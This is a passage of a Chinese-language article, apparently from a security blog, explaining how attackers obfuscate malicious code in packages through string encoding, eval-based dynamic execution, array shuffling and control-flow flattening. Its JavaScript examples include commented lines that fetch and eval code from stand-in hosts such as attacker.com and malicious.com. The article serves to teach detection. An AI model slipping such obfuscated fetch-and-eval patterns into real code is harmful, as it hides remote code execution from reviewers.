URL、敏感令牌或恶意命令，使得自动化扫描器和人工审查难以迅速识别其恶意意图。\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"如何帮助攻击者：\"}],\" 可读的字符串（如 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"https://evil-domain.com/malware.exe\"}],\"）被转换为编码序列（如十六进制 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"\\\\x68\\\\x74\\\\x74\\\\x70...\"}],\"、Unicode \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"\\\\u0068\\\\u0074...\"}],\" 或 Base64 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"aHR0cHM6Ly9ldmlsLWRvbWFpbi5jb20vbWFsd2FyZS5leGU=\"}],\"）。这些编码后的字符串在代码中不再那么显眼，更容易与正常代码混为一谈。\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"原理详解：\"}],\" 计算机在处理字符时，本质上是处理其对应的数字编码（例如 ASCII、Unicode）。攻击者利用这一点，不直接在代码中写入明文字符串，而是写入这些字符的编码表示。程序在运行时，会先将这些编码值解码回原始字符串，然后再执行相应的操作。\"]}],[\"$\",\"ul\",null,{\"children\":[[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"十六进制/八进制编码：\"}],\" 将每个字符用其十六进制（如 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"\\\\x41\"}],\" 代表 'A'）或八进制（如 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"\\\\101\"}],\" 代表 'A'）形式表示。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"Unicode 转义：\"}],\" 使用 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"\\\\uXXXX\"}],\" 格式表示 Unicode 字符。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"Base64 编码：\"}],\" 将二进制数据转换成由64个可打印字符组成的文本字符串，常用于隐藏较长的字符串或二进制内容。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"自定义编码/加密：\"}],\" 攻击者甚至可能使用自定义的简单加密算法（如凯撒密码、XOR 加密）或更复杂的加密库来隐藏字符串，然后在运行时解密。\"]}]]}],[\"$\",\"$L19\",null,{\"className\":\"language-javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 原始恶意 URL: \\\"http://malicious.com/payload\\\"\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 十六进制编码示例\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" encodedUrlHex \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'\\\\x68\\\\x74\\\\x74\\\\x70\\\\x3a\\\\x2f\\\\x2f\\\\x6d\\\\x61\\\\x6c\\\\x69\\\\x63\\\\x69\\\\x6f\\\\x75\\\\x73\\\\x2e\\\\x63\\\\x6f\\\\x6d\\\\x2f\\\\x70\\\\x61\\\\x79\\\\x6c\\\\x6f\\\\x61\\\\x64'\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// fetch(encodedUrlHex); // 运行时解码并执行\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// Base64 编码示例\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" encodedUrlBase64 \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'aHR0cDovL21hbGljaW91cy5jb20vcGF5bG9hZA=='\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// fetch(atob(encodedUrlBase64)); // 运行时解码并执行 (atob是浏览器提供的Base64解码函数)\"}],\"\\n\"]}]]}]}],[\"$\",\"h3\",null,{\"className\":\"content-header\",\"id\":\"2-动态代码生成与执行-dynamic-code-generation--execution\",\"children\":[[\"$\",\"a\",null,{\"href\":\"#2-动态代码生成与执行-dynamic-code-generation--execution\",\"aria-hidden\":\"true\",\"tabIndex\":\"-1\",\"children\":[\"$\",\"span\",null,{\"className\":\"content-header-link\",\"children\":[\"$\",\"svg\",null,{\"className\":\"h-5 linkicon w-5\",\"fill\":\"currentColor\",\"viewBox\":\"0 0 20 20\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z\"}],[\"$\",\"path\",null,{\"d\":\"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z\"}]]}]}]}],\"2. 动态代码生成与执行 (Dynamic Code Generation \u0026 Execution)\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"攻击者为何青睐此法：\"}],\" 动态执行允许攻击者在不更改原始受感染包的情况下远程更新和传递有效负载，从而绕过基于静态分析的检测。\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"如何帮助攻击者：\"}],\" 使用如 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"eval()\"}],\" (JavaScript)、\",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"exec()\"}],\" (Python)、\",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"Runtime.exec()\"}],\" (Java) 等函数来执行在运行时生成或从远端获取的字符串形式的代码。这使得静态分析工具无法在分析阶段看到完整的恶意代码。\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"原理详解：\"}],\" 静态分析是在不实际运行代码的情况下检查代码。而动态代码生成与执行则将恶意代码的构建和执行推迟到程序运行时。\"]}],[\"$\",\"ul\",null,{\"children\":[[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":[[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"eval()\"}],\"/\",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"exec()\"}],\" 类函数：\"]}],\" 这些函数接收一个字符串作为参数，并将该字符串当作代码来执行。攻击者可以将恶意代码拆分成碎片，或者从远程服务器下载，然后在运行时拼接成完整的代码字符串再通过 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"eval()\"}],\" 执行。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":[[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"document.write()\"}],\" / \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"innerHTML\"}],\" (浏览器环境)：\"]}],\" 在 Web 环境中，攻击者可能动态地将 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"\u003cscript\u003e\"}],\" 标签写入 DOM，从而执行新的脚本。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"反射 (Reflection) (Java, .NET)：\"}],\" 允许程序在运行时检查和修改其自身结构（类、方法、字段等），可以被用来动态调用隐藏的方法或加载恶意类。\"]}]]}],[\"$\",\"$L19\",null,{\"className\":\"language-javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 示例：动态构建并执行 alert(\\\"hacked!\\\")\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" parts \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"[\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'al'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'er'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'t('\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'\\\"hacked!\\\"'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"')'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"]\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" evilCode \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" parts\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token function method property-access\",\"children\":\"join\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"''\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\\"alert(\\\\\\\"hacked!\\\\\\\")\\\"\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// eval(evilCode);\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 从远程获取代码执行 (概念示例)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// fetch('https://attacker.com/payload.js')\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"//   .then(response =\u003e response.text())\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"//   .then(code =\u003e eval(code));\"}],\"\\n\"]}]]}]}],[\"$\",\"p\",null,{\"children\":\"这种方式对静态分析工具构成了巨大挑战，因为恶意代码在分析阶段根本不存在于代码文件中。\"}],[\"$\",\"h3\",null,{\"className\":\"content-header\",\"id\":\"3-基于数组的字符串混淆与移位-array-based-string-obfuscation-and-shifting\",\"children\":[[\"$\",\"a\",null,{\"href\":\"#3-基于数组的字符串混淆与移位-array-based-string-obfuscation-and-shifting\",\"aria-hidden\":\"true\",\"tabIndex\":\"-1\",\"children\":[\"$\",\"span\",null,{\"className\":\"content-header-link\",\"children\":[\"$\",\"svg\",null,{\"className\":\"h-5 linkicon w-5\",\"fill\":\"currentColor\",\"viewBox\":\"0 0 20 20\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z\"}],[\"$\",\"path\",null,{\"d\":\"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z\"}]]}]}]}],\"3. 基于数组的字符串混淆与移位 (Array-Based String Obfuscation and Shifting)\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"攻击者为何青睐此法：\"}],\" 将字符串存储在数组中，并通过间接引用（如下标计算、函数调用返回下标等）来访问，这使得逆向工程和人工代码审查变得更加复杂。\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"如何帮助攻击者：\"}],\" 敏感字符串被拆分、打乱顺序后存储在数组中，通过复杂的索引逻辑或函数调用来重组和访问，从而掩盖其真实意图，减慢分析速度。\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"原理详解：\"}],\" 此技术的核心思想是将完整的字符串打散成多个部分，存储在一个或多个数组中。然后通过索引、循环、函数调用等方式在运行时动态地将这些部分重新组合成原始字符串。\"]}],[\"$\",\"ul\",null,{\"children\":[[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"字符串分割与重组：\"}],\" \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"\\\"secret_key\\\"\"}],\" 可能被存储为 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"[\\\"sec\\\", \\\"ret_\\\", \\\"key\\\"]\"}],\"，然后通过 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"arr[0] + arr[1] + arr[2]\"}],\" 来重组。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"顺序打乱与重排：\"}],\" 数组中的元素顺序可能是乱的，通过另一个数组或逻辑来指定正确的重组顺序。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"数组移位/旋转：\"}],\" 有些混淆器（如 JavaScript Obfuscator Tool 的 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"stringArrayRotate\"}],\" 选项）会初始化一个包含所有字符串片段的数组，并在每次访问前对数组进行“旋转”（将最后一个元素移到最前面，或反之），使得每次实际访问的元素下标都在变化，增加了追踪难度。\"]}]]}],[\"$\",\"$L19\",null,{\"className\":\"language-javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 直接看难以理解:\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" confusingArray \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"[\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'https://'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'domain'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'.com'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'evil-'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'/path'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"]\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 假设通过某种逻辑计算出正确的索引顺序\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" p1 \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" confusingArray\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"[\"}],[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"0\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"]\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\\"https://\\\"\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" p2 \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" confusingArray\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"[\"}],[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"3\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"]\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\\"evil-\\\"\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" p3 \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" confusingArray\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"[\"}],[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"1\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"]\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\\"domain\\\"\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" p4 \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" confusingArray\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"[\"}],[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"2\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"]\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\\".com\\\"\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" p5 \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" confusingArray\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"[\"}],[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"4\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"]\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\\"/path\\\"\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" finalUrl \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" p1 \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"+\"}],\" p2 \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"+\"}],\" p3 \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"+\"}],\" p4 \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"+\"}],\" p5 \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\\"https://evil-domain.com/path\\\"\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// fetch(finalUrl);\"}],\"\\n\"]}]]}]}],[\"$\",\"p\",null,{\"children\":\"分析人员需要仔细追踪数组元素如何被访问和组合，才能理解最终形成的字符串。\"}],[\"$\",\"h3\",null,{\"className\":\"content-header\",\"id\":\"4-控制流混淆-control-flow-obfuscation\",\"children\":[[\"$\",\"a\",null,{\"href\":\"#4-控制流混淆-control-flow-obfuscation\",\"aria-hidden\":\"true\",\"tabIndex\":\"-1\",\"children\":[\"$\",\"span\",null,{\"className\":\"content-header-link\",\"children\":[\"$\",\"svg\",null,{\"className\":\"h-5 linkicon w-5\",\"fill\":\"currentColor\",\"viewBox\":\"0 0 20 20\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z\"}],[\"$\",\"path\",null,{\"d\":\"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z\"}]]}]}]}],\"4. 控制流混淆 (Control Flow Obfuscation)\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"攻击者为何青睐此法：\"}],\" 复杂的条件判断、冗余的循环、无意义的跳转等会使代码的执行逻辑变得混乱不堪，导致审查人员在看似无害的代码中忽略隐藏的恶意意图。\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"如何帮助攻击者：\"}],\" 混淆的控制流会分散审查人员的注意力，降低检测效率。分析师可能难以确定代码的真实执行路径。\"]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"原理详解：\"}],\" 控制流混淆旨在打乱程序正常的执行顺序，使其难以通过阅读代码来理解。\"]}],[\"$\",\"ul\",null,{\"children\":[[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"不透明谓词 (Opaque Predicates)：\"}],\" 插入一些条件判断语句，其结果在混淆时是已知的（例如 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"if (x*x \u003e= 0)\"}],\" 总是为真，\",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"if (1 === 0)\"}],\" 总是为假），但对于分析工具或阅读者来说可能不那么直观。恶意代码可以被隐藏在这些看似永不执行或总是执行的分支中。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"控制流平坦化 (Control Flow Flattening)：\"}],\" 将原始代码块（如函数体内的语句序列）分解成许多小的代码片段，然后将这些片段放入一个大的 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"switch\"}],\" 语句或类似的调度结构中。通过一个状态变量来控制 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"switch\"}],\" 语句在不同片段之间的跳转。这使得原始的顺序、分支、循环结构变得模糊不清。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"无效代码插入：\"}],\" 在正常的代码块之间插入大量与程序逻辑无关的“垃圾”指令或调用，干扰分析。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"跳转表 (Jump Tables)：\"}],\" 使用函数指针数组或类似的机制，根据计算结果动态决定下一个要执行的代码块。\"]}]]}],[\"$\",\"$L19\",null,{\"className\":\"language-javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 简单示例：控制流平坦化 (概念)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" state \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"0\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"while\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token boolean\",\"children\":\"true\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"switch\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"state\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"case\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"0\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// console.log(\\\"Step 1\\\");\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"      state \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"2\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 跳转到 case 2\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"break\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"case\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"1\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 这个 case 可能永远不会被直接调用，或者通过复杂计算才到达\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// window[\\\"e\\\" + \\\"val\\\"](\\\"alert('malicious code')\\\"); // 恶意代码\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"      state \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"3\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"break\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"case\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token number\",\"children\":\"2\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\":\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// console.log(\\\"Step 2\\\");\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"if\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"someCondition\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token 